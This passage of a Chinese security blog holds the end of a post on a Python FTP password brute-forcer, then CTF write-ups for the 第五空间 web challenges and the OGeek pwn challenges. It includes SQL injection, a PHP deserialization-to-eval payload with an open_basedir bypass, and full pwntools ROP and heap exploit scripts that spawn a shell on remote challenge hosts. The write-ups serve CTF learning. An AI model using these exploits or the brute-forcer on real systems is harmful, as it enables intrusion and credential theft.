class="line"><span class="string">	except: </span></span><br><span class="line"><span class="string">		print ('Wordlist error')</span></span><br></pre></td></tr></table></figure>

<p>我们将使用 ftplib 模块中的工具来实现 FTP 协议，所以首先我们导入它。然后，我们创建一个名为 server 的变量和另一个名为 user 的变量，它将存储一些用户输入的命令。你的脚本将提示用户输入 FTP 服务器的 IP 地址➊和用户尝试进入的帐户的用户名➋。<br>然后我们询问用户密码列表➌的路径。通过在终端中输入 locate wordlist，您可以在 kali linux 中找到许 多密码列表。<br>然后，我们开始 try 代码块，该代码将使用用户提供的密码列表来尝试破解用户提供的用户名的密码。</p>
<p>注意，我们使用了一个新的名为 strip()➎的 python 函数。此函数删除字符串的第一个和最后一个字符 （在这里是密码列表）。如果此列表中的密码前面有空格或逗号，则需要执行此操作。strip()函数的作用是： 删除这些字符，只留下潜在密码的字符串。如果我们不去除空白，我们可能会得到一个假阴性。<br>然后，我们使用第二个 try➏代码块。这里，我们首先使用 ftplib 模块连接到用户提供的 IP 地址的服务 器，然后从该帐户的密码列表中尝试下一个密码。<br>如果用户名和密码的组合导致错误，则代码块退出并转到 except 子句➑，在该子句中打印 still trying， 然后返回到 for 子句的顶部并从密码列表中获取下一个密码以尝试。<br>如果组合成功，成功的密码将会被打印到屏幕上➐。最后一行记录任何其他可能导致错误的情况。例 如，如果用户输入程序无法处理的内容，例如单词表的路径错误或缺少单词表。<br>现在，让我们对 192.168.1.101 的 FTP 服务运行这个脚本，看看是否可以破解 root 用户的密码。我使用 的是我工作目录中名为 bigpasswordlist.txt 的密码列表。如果密码列表不在你的工作目录中，您可能需要提 供到所使用密码列表的完整路径（例如，/usr/share/bigpasswordlist.txt）。 </p>
<p>如果想要学习更多 Python 知识，强烈推荐由 Al Sweigart 编写的 No Starch Press 出版社 的优秀书籍《Automate the Boring Stuff with Python (2015)》。 </p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2019/09/12/Linux 基基基基基基础/" data-id="ck2g3l2m3001algv3d7dmt480" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/note/">note</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-第五空间" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/08/29/第五空间/" class="article-date">
  <time datetime="2019-08-29T04:18:35.000Z" itemprop="datePublished">2019-08-29</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/08/29/第五空间/">第五空间-Web WP</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="空相"><a href="#空相" class="headerlink" title="空相"></a>空相</h2><p> 一道签到题，提示参数是id  尝试?id=1为禁止进入2为text  </p>
<p>?id=1’ or 1=1 绕过  </p>
<p>给出flag的php文件，提交token得到flag</p>
<h2 id="八苦"><a href="#八苦" class="headerlink" title="八苦"></a>八苦</h2><p>（三道web题中唯一正常一点的）</p>
<p>（环境关了，早上做出来的题，记不太清了，记错了也，，2333333）</p>
<p>进入靶机，发现只有一个welcome，啥也没有。各种备份泄露试一波，最后发现是phps</p>
<p>然后得到源码（user类当时觉得没用就删了）</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">rror_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $careful;</span><br><span class="line">    <span class="keyword">public</span> $securuty = <span class="keyword">array</span>(<span class="string">'say_hello'</span>=&gt;<span class="string">'1'</span>);</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;careful===<span class="number">1</span>)&#123;</span><br><span class="line">            phpinfo();	<span class="comment">// step 1:	read source,get phpinfo and read it carefullt</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($name)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;securuty[$name];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($param1,$param2)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;$param1&#125;)&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">'$a='</span>.$_GET[<span class="string">'dangerous'</span>].<span class="string">';'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后根据提示，先去看phpinfo</p>
<p>构造序列化</p>
<p><img src="/2019/08/29/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4/1.png" alt="1"></p>
<p>O:4:”Test”:2:{s:10:” * careful”;i:1;s:8:”securuty”;a:1:{s:9:”say_hello”;s:1:”1”;}}</p>
<p>因为protected的关系，好像中间有截断，所以urlencode，</p>
<p>然后传给foo，得到phpinfo</p>
<p>ctrl f 搜索.php 得到一个 preload.php（具体啥名字忘记了）</p>
<p>然后得到源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Welcome</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">say_hello</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"welcome&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Welcome_again</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $willing ;</span><br><span class="line">    <span class="keyword">public</span> $action ;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;action=<span class="keyword">new</span> Welcome;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;willing)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;action-&gt;say_hello();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>类似于强网杯upload</p>
<p>姿势：</p>
<p>生成Welcome_again 类，</p>
<p>willing 赋值 1，action 赋值 new Test（），Test 中 赋值securuty 以键值对  ‘say_hello’=&gt; 1</p>
<p>利用链：</p>
<p>首先生成Welcome_again 类，调用__construct()方法赋值action</p>
<p>然后调用__destruct()方法，（此时$this-&gt;willing=1）</p>
<p>因为action = new Test()</p>
<p>所以调用  Test.say_hello()</p>
<p>但是Test没有该方法，所以调用__call()方法</p>
<p>然后  if($this-&gt;{$param1})</p>
<p>又没有改属性，所以调用__get()方法</p>
<p>返回1（我们之前构造的键值对中的值）</p>
<p>然后通过判断，</p>
<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="string">'$a='</span>.$_GET[<span class="string">'dangerous'</span>].<span class="string">';'</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure>

<p>这里利用  ;  截断，</p>
<p>使得eval执行不止一个函数</p>
<p>然后翻出之前收藏的读文件一把梭，</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1;<span class="variable">$fp</span> = fopen(<span class="string">"./index.php"</span>,<span class="string">"r"</span>);<span class="variable">$str</span> = fread(<span class="variable">$fp</span>,filesize(<span class="string">"./index.php"</span>));<span class="built_in">echo</span> <span class="variable">$str</span> = str_replace(<span class="string">"\r\n"</span>,<span class="string">"&lt;br /&gt;"</span>,<span class="variable">$str</span>);</span><br><span class="line"></span><br><span class="line">1;<span class="built_in">echo</span> readfile(<span class="string">"./index.php"</span>);</span><br></pre></td></tr></table></figure>

<p>(忘记当时用的哪个了)</p>
<p>发现成功</p>
<p>然后去读flag</p>
<p>发现失败，</p>
<p>要bypass open_basedir</p>
<p>参考wp</p>
<p><a href="https://blog.csdn.net/systemino/article/details/94645518中的" target="_blank" rel="noopener">https://blog.csdn.net/systemino/article/details/94645518中的</a></p>
<p>尝试构造：</p>
<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">chdir</span>(<span class="string">'/tmp'</span>);</span><br><span class="line"><span class="selector-tag">mkdir</span>(<span class="string">'sky'</span>);</span><br><span class="line"><span class="selector-tag">chdir</span>(<span class="string">'sky'</span>);</span><br><span class="line"><span class="selector-tag">ini_set</span>(<span class="string">'open_basedir'</span>,<span class="string">'..'</span>);</span><br><span class="line"><span class="selector-tag">chdir</span>(<span class="string">'..'</span>);</span><br><span class="line"><span class="selector-tag">chdir</span>(<span class="string">'..'</span>);</span><br><span class="line"><span class="selector-tag">chdir</span>(<span class="string">'..'</span>);</span><br><span class="line"><span class="selector-tag">chdir</span>(<span class="string">'..'</span>);</span><br><span class="line"><span class="selector-tag">ini_set</span>(<span class="string">'open_basedir'</span>,<span class="string">'/'</span>);</span><br><span class="line"><span class="selector-tag">echo</span>(file_get_contents(<span class="string">'/var/www/flag.php'</span>));</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<p>最终payload：</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">foo=O%3A13%3A%22Welcome_again%22%3A2%3A%7Bs%3A7%3A%22willing%22%3Bi%3A1%3Bs%3A6%3A%22action%22%3BO%3A4%3A%22Test%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00careful%22%3Bi%3A0%3Bs%3A8%3A%22securuty%22%3Ba%3A1%3A%7Bs%3A9%3A%22say_hello%22%3Bs%3A1%3A%221%22%3B%7D%7D%7D</span><br><span class="line">&amp;dangerous=<span class="number">1</span>;<span class="keyword">chdir</span>(<span class="string">'/tmp'</span>);<span class="keyword">mkdir</span>(<span class="string">'sky'</span>);<span class="keyword">chdir</span>(<span class="string">'sky'</span>);ini_set(<span class="string">'open_basedir'</span>,<span class="string">'..'</span>);<span class="keyword">chdir</span>(<span class="string">'..'</span>);<span class="keyword">chdir</span>(<span class="string">'..'</span>);<span class="keyword">chdir</span>(<span class="string">'..'</span>);<span class="keyword">chdir</span>(<span class="string">'..'</span>);ini_set(<span class="string">'open_basedir'</span>,<span class="string">'/'</span>);echo(file_get_contents(<span class="string">'/var/www/flag.php'</span>));</span><br></pre></td></tr></table></figure>

<h2 id="六尘"><a href="#六尘" class="headerlink" title="六尘"></a>六尘</h2><p>非预期解</p>
<p>Wwwscan扫描到存在log，</p>
<p>访问<a href="http://111.33.164.6:10005/log/access.log" target="_blank" rel="noopener">http://111.33.164.6:10005/log/access.log</a></p>
<p>搜索flag发现<br><img src="/2019/08/29/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4/2.png" alt="2"></p>
<p>似乎是别的解出题目的队伍去拿flag时留下来的流量？（白嫖一手）</p>
<p>进去加上token即可得到flag</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2019/08/29/第五空间/" data-id="ck2g3l2ev0006lgv3xcoa1n0v" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Write-UP/">Write UP</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-OGeek_WP" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/08/27/OGeek_WP/" class="article-date">
  <time datetime="2019-08-27T03:02:35.000Z" itemprop="datePublished">2019-08-27</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/08/27/OGeek_WP/">OGeek-CTF WP</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="OGeek-CTF-WP"><a href="#OGeek-CTF-WP" class="headerlink" title="OGeek-CTF WP"></a>OGeek-CTF WP</h1><h3 id="catch-fun"><a href="#catch-fun" class="headerlink" title="catch fun"></a>catch fun</h3><p>题目描述：oppo catch fun</p>
<p>​        提示：oppo’s phone model，flag{} is required</p>
<p>百度： oppo catch fun</p>
<p><img src="/2019/08/27/OGeek_WP/1566744395057.png" alt="1566744395057"></p>
<p>根据提示得到flag</p>
<p>flag{Reno}</p>
<h3 id="Easy-Realworld-Challenge-2"><a href="#Easy-Realworld-Challenge-2" class="headerlink" title="Easy Realworld Challenge 2 *"></a>Easy Realworld Challenge 2 *</h3><p>题目描述：flag is in localhost, show me your shell!</p>
<h3 id="babyrop"><a href="#babyrop" class="headerlink" title="babyrop"></a>babyrop</h3><p>题目描述：From the ground up.</p>
<p>这道题简单看看，strncmp函数可以绕过，v1即比较的长度可以控制，我们可以随意输入一个数字比如1，然后和随机数比较第一个数字，爆破绕过。接着存在栈溢出可能性的函数的溢出长度最大为0xff，且可以由上一个函数的输入来控制。剩下的就是简单的rop了。</p>
<p>exp脚本如下：</p>
<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/python</span></span><br><span class="line"><span class="meta">#-*- coding:UTF-8 -*-</span></span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'split'</span>, <span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#p = process(<span class="string">"./babyrop"</span>)</span></span><br><span class="line">p = remote(<span class="string">'47.112.137.238'</span>, <span class="number">13337</span>)</span><br><span class="line">elf = ELF(<span class="string">'./babyrop'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line"></span><br><span class="line">vuln_addr = <span class="number">0x080487D0</span></span><br><span class="line">p.<span class="built_in">send</span>(<span class="string">'1'</span>+<span class="string">'\x00'</span>*<span class="number">6</span> + <span class="string">'\xff'</span> + <span class="string">'\n'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Correct\n'</span>)</span><br><span class="line"><span class="meta">#gdb.attach(p)</span></span><br><span class="line">p.<span class="built_in">send</span>(<span class="string">'\x00'</span>*<span class="number">0xe7</span> + p32(<span class="number">0xdeadbeaf</span>) + p32(elf.plt[<span class="string">'puts'</span>]) + p32(vuln_addr) + p32(elf.got[<span class="string">'puts'</span>]) + p32(<span class="number">0xffffffff</span>))</span><br><span class="line"></span><br><span class="line">libcbase = u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>, <span class="string">'\x00'</span>)) - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line"><span class="meta">#libcbase = u32(p.recv(4).ljust(4, <span class="string">'\x00'</span>)) - 0x60ca0</span></span><br><span class="line"><span class="built_in">log</span>.info(<span class="string">'libcbase:%#x'</span> %libcbase)</span><br><span class="line">system_addr = libcbase + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"><span class="meta">#system_addr = libcbase + 0x3bda0</span></span><br><span class="line">bin_sh = libcbase + <span class="number">0x15902b</span></span><br><span class="line">p.<span class="built_in">send</span>(<span class="string">'\x00'</span>*<span class="number">0xe7</span> + p32(<span class="number">0xdeadbeaf</span>) + p32(system_addr) + p32(vuln_addr) + p32(bin_sh))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="/2019/08/27/OGeek_WP/1566789070936.png" alt="1566789070936"></p>
<h3 id="book-manager"><a href="#book-manager" class="headerlink" title="book manager"></a>book manager</h3><p>题目描述：Endless book writing.</p>
<p>简单逆一下，可以很容易找到addtext函数中出现堆溢出，当v7的值小于0x100时，可以往里面写入0x100个字节。于是构造一下堆结构，改写一个text_ptr指向已经释放在unsortedbin中chunk，然后showbook，泄露出libc，然后再利用溢出修改一个text_ptr指向free_hook，改写为system函数地址，然后free一个/bin/sh即可getshell。脚本如下。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#-*- coding:UTF-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'split'</span>, <span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process('./bookmanager')</span></span><br><span class="line">p = remote(<span class="string">'47.112.115.30'</span>, <span class="number">13337</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choose</span><span class="params">(choice)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice:'</span>)</span><br><span class="line">    p.sendline(str(choice))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">AddChapter</span><span class="params">(chapterName)</span>:</span></span><br><span class="line">    choose(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Chapter name:'</span>)</span><br><span class="line">    p.send(chapterName)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">AddSection</span><span class="params">(chapterName, sectionName)</span>:</span></span><br><span class="line">    choose(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Which chapter do you want to add into:'</span>)</span><br><span class="line">    p.send(chapterName)</span><br><span class="line">    sectionAddr = int(p.recvuntil(<span class="string">'\nSection name:'</span>, drop=<span class="literal">True</span>)[<span class="number">2</span>:], <span class="number">16</span>)</span><br><span class="line">    p.send(sectionName)</span><br><span class="line">    <span class="keyword">return</span> sectionAddr</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">AddText</span><span class="params">(sectionName, size, text)</span>:</span></span><br><span class="line">    choose(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'\nWhich section do you want to add into:'</span>)</span><br><span class="line">    p.send(sectionName)</span><br><span class="line">    p.recvuntil(<span class="string">'\nHow many chapters you want to write:'</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">'\nText:'</span>)</span><br><span class="line">    p.send(text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">DelChapter</span><span class="params">(chapterName)</span>:</span></span><br><span class="line">    choose(<span class="number">4</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'\nChapter name:'</span>)</span><br><span class="line">    p.send(chapterName)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">DelSection</span><span class="params">(sectionName)</span>:</span></span><br><span class="line">    choose(<span class="number">5</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'\nSection name:'</span>)</span><br><span class="line">    p.send(sectionName)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">DelText</span><span class="params">(sectionName)</span>:</span></span><br><span class="line">    choose(<span class="number">6</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'\nSection name:'</span>)</span><br><span class="line">    p.send(sectionName)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ShowBook</span><span class="params">()</span>:</span></span><br><span class="line">    choose(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Update</span><span class="params">(flag, oldName, newName)</span>:</span></span><br><span class="line">    choose(<span class="number">8</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'\nWhat to update?(Chapter/Section/Text):'</span>)</span><br><span class="line">    <span class="keyword">if</span> flag == <span class="number">1</span>:</span><br><span class="line">        p.sendline(<span class="string">'Chapter'</span>)</span><br><span class="line">        p.recvuntil(<span class="string">'\nChapter name:'</span>)</span><br><span class="line">        p.send(oldName)</span><br><span class="line">        p.recvuntil(<span class="string">'\nNew Chapter name:'</span>)</span><br><span class="line">        p.send(newName)</span><br><span class="line">    <span class="keyword">elif</span> flag == <span class="number">2</span>:</span><br><span class="line">        p.sendline(<span class="string">'Section'</span>)</span><br><span class="line">        p.recvuntil(<span class="string">'\nSection name:'</span>)</span><br><span class="line">        p.send(oldName)</span><br><span class="line">        p.recvuntil(<span class="string">'\nNew Section name:'</span>)</span><br><span class="line">        p.send(newName)</span><br><span class="line">    <span class="keyword">elif</span> flag == <span class="number">3</span>:</span><br><span class="line">        p.sendline(<span class="string">'Text'</span>)</span><br><span class="line">        p.recvuntil(<span class="string">'\nSection name:'</span>)</span><br><span class="line">        p.send(oldName)</span><br><span class="line">        p.recvuntil(<span class="string">'\nNew Text:'</span>)</span><br><span class="line">        p.send(newName)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Name of the book you want to create: '</span>)</span><br><span class="line">p.sendline(<span class="string">'aaaa'</span>)</span><br><span class="line">AddChapter(<span class="string">'cha1'</span>)</span><br><span class="line">AddSection(<span class="string">'cha1'</span>, <span class="string">'sec1'</span>)</span><br><span class="line">AddText(<span class="string">'sec1'</span>, <span class="number">0x10</span>, <span class="string">'text1'</span>)</span><br><span class="line">AddSection(<span class="string">'cha1'</span>, <span class="string">'sec2'</span>)</span><br><span class="line">AddText(<span class="string">'sec2'</span>, <span class="number">0x100</span>, <span class="string">'text2'</span>)</span><br><span class="line">AddSection(<span class="string">'cha1'</span>, <span class="string">'sec3'</span>)</span><br><span class="line">sec4_addr = AddSection(<span class="string">'cha1'</span>, <span class="string">'sec4'</span>)</span><br><span class="line">text4_addr = sec4_addr + <span class="number">0x40</span></span><br><span class="line">AddText(<span class="string">'sec4'</span>, <span class="number">0x90</span>, <span class="string">'text4'</span>)</span><br><span class="line">AddSection(<span class="string">'cha1'</span>, <span class="string">'sec5'</span>)</span><br><span class="line">AddText(<span class="string">'sec5'</span>, <span class="number">0x20</span>, <span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line">DelText(<span class="string">'sec4'</span>)</span><br><span class="line">Update(<span class="number">3</span>, <span class="string">'sec1'</span>, <span class="string">'\x00'</span>*<span class="number">0x10</span> + p64(<span class="number">0x0</span>) + p64(<span class="number">0x41</span>) + <span class="string">'sec2'</span>.ljust(<span class="number">0x20</span>, <span class="string">'\x00'</span>) + p64(text4_addr) + p64(<span class="number">0x20</span>) + p64(<span class="number">0x0</span>) + p64(<span class="number">0x111</span>))</span><br><span class="line"></span><br><span class="line">ShowBook()</span><br><span class="line">p.recvuntil(<span class="string">'Section:sec2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'\n      Text:'</span>)</span><br><span class="line">libcbase = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - <span class="number">0x3c4b78</span> </span><br><span class="line">log.info(<span class="string">'libcbase:%#x'</span> %libcbase)</span><br><span class="line">free_hook = libcbase + <span class="number">0x3C67A8</span></span><br><span class="line">system_addr = libcbase + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">Update(<span class="number">3</span>, <span class="string">'sec1'</span>, <span class="string">'\x00'</span>*<span class="number">0x10</span> + p64(<span class="number">0x0</span>) + p64(<span class="number">0x41</span>) + <span class="string">'sec2'</span>.ljust(<span class="number">0x20</span>, <span class="string">'\x00'</span>) + p64(free_hook) + p64(<span class="number">0x20</span>) + p64(<span class="number">0x0</span>) + p64(<span class="number">0x111</span>))</span><br><span class="line"></span><br><span class="line">Update(<span class="number">3</span>, <span class="string">'sec2'</span>, p64(system_addr))</span><br><span class="line"></span><br><span class="line">DelText(<span class="string">'sec5'</span>)</span><br><span class="line"> </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="/2019/08/27/OGeek_WP/1566789094683.png" alt="1566789094683"></p>
<h3 id="LookAround"><a href="#LookAround" class="headerlink" title="LookAround"></a>LookAround</h3><p>题目描述：builded from tomcat:8-jre8</p>
<p>进入靶机，f12一波，发现</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"./js/_.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>进入：<a href="http://47.107.253.140:18080/webserver/js/_.js" target="_blank" rel="noopener">http://47.107.253.140:18080/webserver/js/_.js</a></p>
<p>得到</p>
